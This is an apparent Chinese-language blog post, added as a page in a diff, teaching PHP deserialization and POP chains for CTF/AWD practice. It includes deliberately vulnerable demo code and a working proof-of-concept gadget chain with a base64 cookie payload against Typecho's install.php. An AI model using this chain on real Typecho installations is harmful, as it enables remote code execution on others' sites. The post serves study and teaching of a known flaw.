@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="manifest" href="/manifest.json">
+  <link rel="apple-touch-startup-image" href="images/hexo.png">
+  <link rel="apple-touch-icon" href="images/icons/icon-72x72.png">
+<link rel="apple-touch-icon" sizes="152x152" href="images/icons/icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="images/icons/icon-192x192.png">
+<link rel="apple-touch-icon" sizes="167x167" href="images/icons/icon-192x192.png">
+<meta name="google-site-verification" content="L5kWE5AiVRVNF1nYqMGyNoUu7WToxJIl3d8MmFk4Cjw" />
+  <meta charset="utf-8">
+  
+  
+    <meta name="keywords" content="Migraine,个人博客,日记,pwn,二进制,ctf,浏览器">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    PHP反序列化漏洞 |
+    
+    Migraine殇</title>
+  
+    <link rel="shortcut icon" href="/fujiang.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-phpunserialize" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      PHP反序列化漏洞
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/07/21/phpunserialize/" class="article-date">
+  <time datetime="2019-07-21T03:43:50.000Z" itemprop="datePublished">2019-07-21</time>
+</a>
+        
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <p>概述:打线下AWD模式遇到一个PHP反序列化漏洞，触及到了自己的知识盲区，补习一下。</p>
+<p><em>关键字：序列化、POP链</em></p>
+ <a id="more"></a>
+
+<h2 id="0x01基础知识"><a href="#0x01基础知识" class="headerlink" title="0x01基础知识"></a>0x01基础知识</h2><h3 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h3><p>序列化：将类对象转化为可以传输的字符串 //注意：是类对象而不是类</p>
+<p>反序列化：将字符串转化为类对象</p>
+<p>PHP分别由serialize()和unserialize()两个函数来进行序列化与反序列化。</p>
+<p>下面分别举例两者的实现。</p>
+<p>序列化过程</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*Created by Migraine*/</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Welcome to the PHP unserialize Bug test  &lt;br/&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'  --Edited by Migriane&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">/*定义类Person*/</span>	</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $name=<span class="string">''</span>;</span><br><span class="line">		<span class="keyword">public</span> $age=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Information</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;/br&gt;Person:'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">' is '</span>.<span class="keyword">$this</span>-&gt;age.<span class="string">' years old.&lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$per1=<span class="keyword">new</span> Person();</span><br><span class="line">	$per1-&gt;name=<span class="string">'Migriane'</span>;</span><br><span class="line">	$per1-&gt;age=<span class="number">20</span>;</span><br><span class="line">	$per1-&gt;Information();<span class="comment">//调用类</span></span><br><span class="line"><span class="comment">/*序列化类*/</span></span><br><span class="line">	<span class="keyword">echo</span> serialize($per1); <span class="comment">//打印出序列化的类</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>结果如下图所示</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/apFa27.png" alt="apFa27"> </p>
+<p>反序列化过程#借用上面实现的序列化字符串</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*Created by Migraine*/</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Welcome to the PHP unserialize Bug test  &lt;br/&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'  --Edited by Migriane&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">/*反序列化依旧需要创建类Person*/</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $name=<span class="string">''</span>;</span><br><span class="line">		<span class="keyword">public</span> $age=<span class="number">0</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Information</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;/br&gt;Person:'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">' is '</span>.<span class="keyword">$this</span>-&gt;age.<span class="string">' years old.&lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*反序列化*/</span></span><br><span class="line">	$per1=unserialize(<span class="string">'O:6:"Person":2:&#123;s:4:"name";s:8:"Migriane";s:3:"age";i:20;&#125;'</span>);</span><br><span class="line">	$per1-&gt;Information();<span class="comment">//调用类对象</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>结果如下图所示</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/42KgNF.png" alt="42KgNF"> </p>
+<h3 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h3><p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/7GjIZx.png" alt="7GjIZx"> </p>
+<p>下面是实例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>	</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $name=<span class="string">''</span>;</span><br><span class="line">		<span class="keyword">public</span> $age=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Information</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;/br&gt;Person:'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">' is '</span>.<span class="keyword">$this</span>-&gt;age.<span class="string">' years old.&lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Func--&gt;Construct&lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'Func--&gt;toString&lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Func--&gt;Destruct&lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;Magic Fun: &lt;br/&gt;"</span>;</span><br><span class="line">	$per1=<span class="keyword">new</span> Person();</span><br><span class="line">	$per1-&gt;name=<span class="string">'Migriane'</span>;</span><br><span class="line">	$per1-&gt;age=<span class="number">20</span>;</span><br><span class="line">	<span class="keyword">echo</span> $per1;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/ovKKTI.png" alt="ovKKTI"> </p>
+<h2 id="0x02反序列化Demo"><a href="#0x02反序列化Demo" class="headerlink" title="0x02反序列化Demo"></a>0x02反序列化Demo</h2><h3 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h3><p>文件一Test1.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="comment">//创建Vulnerable类</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Vulnerable</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $file_name=<span class="string">'error'</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="comment">//file_get_content函数把文件读取入字符串中</span></span><br><span class="line">			<span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>文件二test2.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="keyword">include</span> <span class="string">"test1.php"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Unserialize Test"</span>;</span><br><span class="line">	$per=unserialize($_GET[<span class="string">'get_serialized'</span>]);</span><br><span class="line">	<span class="keyword">echo</span> $per;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    include “test1.php”;</p>
+<p>​    echo “Unserialize Test”;</p>
+<p>​    $per=unserialize($_GET[‘get_serialized’]);</p>
+<p>​    echo $per;</p>
+<p>?&gt;</p>
+<p>文件一存在一个vulnerable类，其中的toString函数可以读取本地的文件（file_name）。</p>
+<p>文件二则调用了文件一，并且使用反序列化函数接收一个get请求（也就是可控的参数），关键点在于，最后一行代码echo输出了类对象，也就会触发toString函数</p>
+<p>所以思路是序列化一个vulnerable类，自定义需要读取的全局变量file_name.</p>
+<p>以上构造通过GET输入到$per，在调用echo $per时触发toString魔法函数，成功实现任意文件读取。</p>
+<p>下面是POC</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Vulnerable</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $file_name=<span class="string">'error'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$per=<span class="keyword">new</span> Vulnerable();</span><br><span class="line">	$per-&gt;file_name=<span class="string">'Secret.txt'</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> serialize($per);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    class Vulnerable</p>
+<p>​    {</p>
+<p>​        public $file_name=’error’;</p>
+<p>​    }</p>
+<p>​    $per=new Vulnerable();</p>
+<p>​    $per-&gt;file_name=’Secret.txt’;</p>
+<p>​    </p>
+<p>​    echo serialize($per);</p>
+<p>?&gt;</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/vw4Cuk.png" alt="vw4Cuk"> </p>
+<p>得到payload为    <em>O:10:”Vulnerable”:1:{s:9:”file_name”;s:10:”Secret.txt”;}</em></p>
+<p>直接通过GET提交序列化过的payload</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/prX4LZ.png" alt="prX4LZ"> </p>
+<p>成功读取Secret.txt文件</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/go1mit.png" alt="go1mit"> </p>
+<h3 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h3><p>只有一个test3.php文件</p>
+<p>但是内部设计的很巧妙，值得分析一下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*创建一个example类*/</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">example</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $handle; <span class="comment">//创建一个handle句柄</span></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">			<span class="keyword">$this</span>-&gt;shutdown();<span class="comment">//魔法函数destruct会自动调用shutdown</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">shutdown</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;handle-&gt;close(); <span class="comment">//调用某个句柄指向的close函数</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">/*创建一个process类*/</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">process</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $pid;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;pid); <span class="comment">//eval函数执行命令</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">/*接收GET参数*/</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">		$user_data=unserialize(urldecode($_GET[<span class="string">'data'</span>]));</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>思路：</p>
+<p>非常容易知道，通过传递GET参数，可以进行反序列化漏洞利用。</p>
+<p>通过定义pid可以操作process类的eval执行任意参数。可是eval函数并不存在于任何魔法函数中。</p>
+<p>通过观察，发现example类存在魔法函数，可以调用某个句柄的close函数。</p>
+<p>因此，只需要将该句柄换成process类即可完成一次任意代码执行漏洞。（关键字：POP）</p>
+<p>下面是POC</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">example</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $handle;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;shutdown();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">shutdown</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;handle-&gt;close();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">process</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $pid;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;pid);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">		$user_data=unserialize(urldecode($_GET[<span class="string">'data'</span>]));</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>生成payload</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/mKG0pB.png" alt="mKG0pB"> </p>
+<p>通过get传输，成功执行phpinfo()</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/NiC625.png" alt="NiC625"> </p>
+<h2 id="0x03实例分析"><a href="#0x03实例分析" class="headerlink" title="0x03实例分析"></a>0x03实例分析</h2><p>既然大家都拿Typeecho开刀，那我也就不客气了。</p>
+<p>虽然这个漏洞爆出来有些时日了，但是网络上依旧有很多所谓的正式稳定版存在着漏洞。</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/9ohWGl.png" alt="9ohWGl"> </p>
+<p>选择一个15.5.12以前的版本安装即可[<a href="https://github.com/typecho/typecho/releases]" target="_blank" rel="noopener">https://github.com/typecho/typecho/releases]</a></p>
+<p>安装完成的效果图如下所示，</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/FoVqew.png" alt="FoVqew"> </p>
+<p>加上/admin进入后台界面地址 #想起了之前某网站找了半天后台结果在admin目录</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/fOHdr1.png" alt="fOHdr1"> </p>
+<p>漏洞点：</p>
+<p>install.php</p>
+<p>第230行存在一个反序列化输入点，通过Cookie输入。</p>
+<p>第232行存在创建一个类对象的操作，可以触发Typecho_Db的魔法函数__construct</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/TACQRx.png" alt="TACQRx"> </p>
+<p>用notepad++搜索Typecho_Db类的位置</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/FR15HX.png" alt="FR15HX"> </p>
+<p>在\var\Typecho\Db.php中</p>
+<p>分析Typecho_Db类的魔法函数__construct,发现没有可以利用的函数。</p>
+<p>继续分析发现第120行存在字符串和类的拼接，因为PHP是弱类型，会自动触发__ToString将类转化为str函数。</p>
+<p>我们继续寻找一个类，存在可利用的__ToString函数。</p>
+<p>然后控制$adapterName-&gt;这个类，从而使__ToString被调用。#如果ToString中存在敏感函数，那是就可以完成一次漏洞利用。</p>
+<p>这就是构造POP链。</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/ltMctV.png" alt="ltMctV"> </p>
+<p>找到\var\Typecho\Feed.php中的Typecho_Feed类，存在__ToString函数</p>
+<p>但是事情也没有这么顺利，依旧没有找到危险函数。所以继续构造POP链。</p>
+<p>分析发现290行item[]-&gt;screenName,如果将其控制为某一个新的类，类中没有定义screenName，则会触发<strong>get()魔法函数。调用的</strong>get(screenName)</p>
+<p>并且根据定义发现items的来源(_items)是可控的。</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/ddC0GX.png" alt="ddC0GX"> </p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/H66ioW.png" alt="H66ioW"> </p>
+<p>所以接下来又要寻找一个存在_get魔法函数的类</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/DIBrvn.png" alt="DIBrvn"> </p>
+<p>在\var\Typecho\Request.php的typecho_Request类中找到了__get </p>
+<p>发现经过一系列调用，最终程序调用了_applyFilter()函数</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/honoYh.png" alt="honoYh"> </p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/Ezm0sO.png" alt="Ezm0sO"> </p>
+<p>进入这个函数，终于柳暗花明又一村，发现了array_map和call_user_func两个危险函数。</p>
+<p>并且$filter和$value参数都是可控的。</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/b37zat.png" alt="b37zat"> </p>
+<p>写出POC.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $_filter =<span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">private</span> $_params=<span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>]=<span class="string">'phpinfo'</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>]=<span class="string">'1'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> RSS2 = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">	<span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">private</span> $_type;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$items[<span class="string">'author'</span>]=<span class="keyword">new</span> Typecho_Request();</span><br><span class="line">		$items[<span class="string">'category'</span>]=<span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request());<span class="comment">//触发错误，解决数据库500</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>]=$items;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_type=<span class="keyword">$this</span>::RSS2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp=<span class="keyword">array</span>(</span><br><span class="line">	<span class="string">'adapter'</span>=&gt;<span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line">	<span class="string">'prefix'</span>=&gt;<span class="string">'typecho_'</span>	</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*等效</span></span><br><span class="line"><span class="comment">$exp['adapter']=new Typecho_Feed();</span></span><br><span class="line"><span class="comment">$exp['prefix']='typecho';</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>生成POC=&gt;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6Mjp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjc6InBocGluZm8iO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoxOiIxIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjc6InBocGluZm8iO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoxOiIxIjt9fX19fXM6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9</span><br></pre></td></tr></table></figure>
+
+
+
+<p>由于是get方法输入格式为__typecho_config=。。。</p>
+<p>并且有防跨站机制，需要在head添加referer证明非跨站。</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/w94uEo.png" alt="w94uEo"> </p>
+<p>测试POC，由审计源码可知，finish参数不为1，referer设置为本站，将我们的POC放入cookie</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/SUJKEO.png" alt="SUJKEO"> </p>
+<p>但是测试中出现一些问题，一开始怀疑可能是因为PHP版本太高，砍掉了mysql函数，改用mysqli。所以导致访问不了数据库。</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/1yrzEm.png" alt="1yrzEm"> </p>
+<p>但是查询了资料发现，事情并没有这么简单。经过分析发现，POC执行会导致Typecho触发异常，并且内部设置了Typecho_Exception异常类，触发异常以后Typecho会自动能捕捉到异常，并执行异常输出。</p>
